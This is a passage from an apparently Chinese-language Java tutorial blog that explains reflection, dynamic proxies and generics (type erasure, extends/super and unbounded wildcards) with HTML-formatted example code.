personClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method method:methods)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;方法名:&quot;</span> + method.getName() + <span class="string">&quot;\t方法返回值类型:&quot;</span> + method.getReturnType() + <span class="string">&quot;\t方法参数类型:&quot;</span> + method.getParameterTypes() + <span class="string">&quot;\t方法修饰符:&quot;</span> + method.getModifiers());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h2><ul><li><code>getSuperclass()</code>，获取父类类型，<code>getInterfaces()</code>获取当前类实现的所有接口。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionSuper</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        superClass();</span><br><span class="line">        interfaceReflection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">superClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class studentClass = Class.forName(<span class="string">&quot;com.pan3a.reflection.Student&quot;</span>);</span><br><span class="line">        Class teacherClass = studentClass.getSuperclass();</span><br><span class="line">        Class personClass = teacherClass.getSuperclass();</span><br><span class="line">        Class objectClass = personClass.getSuperclass();</span><br><span class="line">        Class objectSuperClass = objectClass.getSuperclass();</span><br><span class="line">        System.out.println(studentClass);</span><br><span class="line">        System.out.println(teacherClass);</span><br><span class="line">        System.out.println(personClass);</span><br><span class="line">        System.out.println(objectClass);</span><br><span class="line"><span class="comment">//      综合可看出除了Object类外，如果类没有继承，那么默认继承Object。</span></span><br><span class="line">        System.out.println(objectSuperClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">interfaceReflection</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class integer = Integer.class;</span><br><span class="line">        Class[] integerInterfaces = integer.getInterfaces();</span><br><span class="line">        <span class="keyword">for</span> (Class integerInterface:integerInterfaces)&#123;</span><br><span class="line">            System.out.println(integerInterface);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><ul><li>平常实现接口方式。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionDynamicProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HelloWorld helloWorld = <span class="keyword">new</span> HelloWorld();</span><br><span class="line">        helloWorld.morning(<span class="string">&quot;Pan3a&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">morning</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">implements</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">morning</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Good morning &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>动态代理实现方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionDynamicProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        InvocationHandler invocationHandler = <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                System.out.println(method);</span><br><span class="line">                <span class="keyword">if</span>(method.getName().equals(<span class="string">&quot;morning&quot;</span>))&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Good morning,&quot;</span> + args[<span class="number">0</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Hello hello = (Hello) Proxy.newProxyInstance(</span><br><span class="line">                Hello.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;Hello.class&#125;,</span><br><span class="line">                invocationHandler);</span><br><span class="line">        hello.morning(<span class="string">&quot;Pan3a&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">morning</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><ul><li>泛型就是定义一种模板</li></ul><h2 id="使用泛型"><a href="#使用泛型" class="headerlink" title="使用泛型"></a>使用泛型</h2><ul><li>泛型类型实际上就是<code>Object</code></li><li>使用泛型时就是把<code>&lt;T&gt;</code>替换成需要的class类型</li><li></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.generics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericsInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person[] person = <span class="keyword">new</span> Person[]&#123;</span><br><span class="line">                <span class="keyword">new</span> Person(<span class="string">&quot;Pan3a&quot;</span>,<span class="number">18</span>),</span><br><span class="line">                <span class="keyword">new</span> Person(<span class="string">&quot;Forever404&quot;</span>,<span class="number">20</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        Arrays.sort(person);</span><br><span class="line">        System.out.printf(Arrays.toString(person));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">Person</span>&gt;</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    Person(String name, <span class="keyword">int</span> score)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Person other)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name.compareTo(other.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name + <span class="string">&quot;,&quot;</span> + <span class="keyword">this</span>.score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写泛型"><a href="#编写泛型" class="headerlink" title="编写泛型"></a>编写泛型</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericsEditor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 多泛型 class Pair&lt;T, K&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pair</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T first;</span><br><span class="line">    <span class="keyword">private</span> T last;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pair</span><span class="params">(T first, T last)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.first = first;</span><br><span class="line">        <span class="keyword">this</span>.last = last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    静态方法使用泛型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;K&gt; <span class="function">Pair&lt;K&gt; <span class="title">create</span><span class="params">(K first, K last)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Pair&lt;K&gt;(first,last);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="擦拭法"><a href="#擦拭法" class="headerlink" title="擦拭法"></a>擦拭法</h2><ul><li>泛型实现方式是擦拭法（Type Erasure）。</li><li>Java的泛型是由编译器在编译时实行的，编译器内部永远把所有类型<code>T</code>视为<code>Object</code>处理，但是，在需要转型的时候，编译器会根据<code>T</code>的类型自动为我们实行安全地强制转型。</li><li>局限一，<code>&lt;T&gt;</code>不能是基本类型，例如<code>int</code>，因为实际类型是<code>Object</code>，<code>Object</code>类型无法持有基本类型。必须是如<code>&lt;Intager&gt;</code>。</li><li>局限二，无法取得泛型的<code>Class。</code></li><li>局限三，无法判断带泛型的类型</li><li>局限四不能实例化<code>&lt;T&gt;</code>类型，因为编译器会把<code>&lt;T&gt;</code>看成<code>&lt;Object&gt;</code>。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.generics;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Type;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.ParameterizedType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericsErasure</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Pair&lt;String&gt; pairOne = <span class="keyword">new</span> Pair&lt;&gt;(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;World&quot;</span>);</span><br><span class="line">        Pair&lt;Integer&gt; pairTwo = <span class="keyword">new</span> Pair&lt;&gt;(<span class="number">123</span>,<span class="number">456</span>);</span><br><span class="line">        Class classOne = pairOne.getClass();</span><br><span class="line">        Class classTwo = pairTwo.getClass();</span><br><span class="line"></span><br><span class="line">        System.out.println(classOne == classTwo);</span><br><span class="line">        System.out.println(classOne == Pair.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*      泛型类无法判断其类型比如String，Integer</span></span><br><span class="line"><span class="comment">        if (pairOne instanceof pairTwo)&#123;</span></span><br><span class="line"><span class="comment">            System.out.println(&quot;&quot;);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        泛型类继承</span></span><br><span class="line">        Class&lt;IntPair&gt; clazz = IntPair.class;</span><br><span class="line">        Type type = clazz.getGenericSuperclass();</span><br><span class="line">        <span class="keyword">if</span> (type <span class="keyword">instanceof</span> ParameterizedType)&#123;</span><br><span class="line">            ParameterizedType parameterizedType = (ParameterizedType) type;</span><br><span class="line">            Type[] types = parameterizedType.getActualTypeArguments();</span><br><span class="line"><span class="comment">//            可能有多个泛型类型</span></span><br><span class="line">            Type firstType = types[<span class="number">0</span>];       <span class="comment">//获取第一个泛型类</span></span><br><span class="line">            Class&lt;?&gt; typeClass = (Class&lt;?&gt;) firstType;</span><br><span class="line">            System.out.println(typeClass);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pair</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T first;</span><br><span class="line">    <span class="keyword">private</span> T last;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pair</span><span class="params">(T first,T last)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.first = first;</span><br><span class="line">        <span class="keyword">this</span>.last = last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IntPair</span> <span class="keyword">extends</span> <span class="title">Pair</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">IntPair</span><span class="params">(Integer first, Integer last)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(first, last);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="extends通配符"><a href="#extends通配符" class="headerlink" title="extends通配符"></a>extends通配符</h2><ul><li><code>&lt;? extends Number&gt;</code>通配符方法。</li><li>引用通配符方法时，<code>Number number = Object.getFirst();</code>这里的<code>Number</code>不能为<code>integer</code>，这样可能因为读取出来的是<code>Double</code>类型导致类型不匹配而报错。</li><li>使用<code>extends</code>时表示可读不可写。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.generics.extend;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericsExtends</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Pair&lt;Integer&gt; pair = <span class="keyword">new</span> Pair&lt;Integer&gt;(<span class="number">123</span>,<span class="number">456</span>);</span><br><span class="line">        <span class="keyword">int</span> n = add(pair);</span><br><span class="line">        System.out.println(n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//  static int add(Pair&lt;Number&gt; p)  这样也会报错无法识别因为Pair&lt;Integer&gt;不是Pair&lt;Number&gt;的子类</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(Pair&lt;? extends Number&gt; pair)</span></span>&#123;</span><br><span class="line">        Number first = pair.getFirst();</span><br><span class="line">        Number last = pair.getLast();</span><br><span class="line"><span class="comment">//        这里会直接编译错误，因为我们如果传入的是Double setFirst是Integer型 因此会出现类型不匹配</span></span><br><span class="line"><span class="comment">//        pair.setFirst(new Integer(first.intValue() + 100));</span></span><br><span class="line">        <span class="keyword">return</span> first.intValue() + last.intValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pair</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T first;</span><br><span class="line">    <span class="keyword">private</span> T last;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pair</span><span class="params">(T first, T last)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.first = first;</span><br><span class="line">        <span class="keyword">this</span>.last = last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFirst</span><span class="params">(T first)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.first = first;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLast</span><span class="params">(T last)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.last = last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="super通配符"><a href="#super通配符" class="headerlink" title="super通配符"></a>super通配符</h2><ul><li><code>&lt;? super Integer&gt;</code>通配符方法。</li><li>可以调用传入<code>Integer</code>引用的方法，例如：<code>obj.setFirst(Integer n);</code></li><li><code>super</code>通配符表示只能写不能读。</li><li>无限定通配符<code>&lt;?&gt;</code>很少使用，可以用<code>&lt;T&gt;</code>替换，同时它是所有<code>&lt;T&gt;</code>类型的超类。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.generics.supers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericsSuper</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Pair&lt;Number&gt; pairOne = <span class="keyword">new</span> Pair&lt;&gt;(<span class="number">12.3</span>, <span class="number">45.6</span>);</span><br><span class="line">        Pair&lt;Integer&gt; pairTwo = <span class="keyword">new</span> Pair&lt;&gt;(<span class="number">123</span>, <span class="number">456</span>);</span><br><span class="line">        setSame(pairOne,<span class="number">100</span>);</span><br><span class="line">        setSame(pairTwo,<span class="number">200</span>);</span><br><span class="line">        System.out.println(pairOne.getFirst() + <span class="string">&quot; &quot;</span> + pairOne.getLast());</span><br><span class="line">        System.out.println(pairTwo.getFirst() + <span class="string">&quot; &quot;</span> + pairOne.getLast());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setSame</span><span class="params">(Pair&lt;? <span class="keyword">super</span> Integer&gt; pair,Integer integer)</span></span>&#123;</span><br><span class="line">        pair.setFirst(integer);</span><br><span class="line">        pair.setLast(integer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pair</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T first;</span><br><span class="line">    <span class="keyword">private</span> T last;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pair</span><span class="params">(T first, T last)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.first = first;</span><br><span class="line">        <span class="keyword">this</span>.last = last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFirst</span><span class="params">(T first)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.first = first;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLast</span><span class="params">(T last)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.last = last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="无限定通配符"><a href="#无限定通配符" class="headerlink" title="无限定通配符"></a>无限定通配符</h2><ul><li><code>&lt;?&gt;</code>既不能读也不能写。</li><li><code>Pair&lt;?&gt;</code>是<code>Pair&lt;T&gt;</code>的超类，因此可以向上转型。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span 